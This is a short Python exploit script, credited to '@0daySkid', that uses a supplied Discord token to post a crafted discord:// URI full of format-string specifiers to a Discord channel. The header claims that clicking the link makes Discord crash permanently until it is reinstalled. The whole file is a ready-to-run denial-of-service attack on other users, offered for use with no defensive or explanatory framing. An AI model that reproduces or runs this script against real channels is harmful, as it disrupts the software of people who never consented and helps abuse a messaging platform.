# Name: Permanent Denial of Service (perma-DoS)
# Description: Send a URI, that if clicked, causes Discord to crash permanently (until reinstalled)
# Author: checksum (@0daySkid)
# Original founder: Insecurity Tube

import requests
import sys

class Exploit:

    def __init__(self, token, channel):
        self.token = token
        self.channel_id = channel
        self.headers = {'Authorization': token}


    def execute(self):
        """ send malicious URI """
        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': '<discord://@%x.@%x.@%x.@%x.>'})


def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <token> <channel id>')
        sys.exit()

    token = sys.argv[1]
    channel_id = sys.argv[2]

    exploit = Exploit(token, channel_id)

    exploit.execute()


if __name__ == '__main__':
    main()
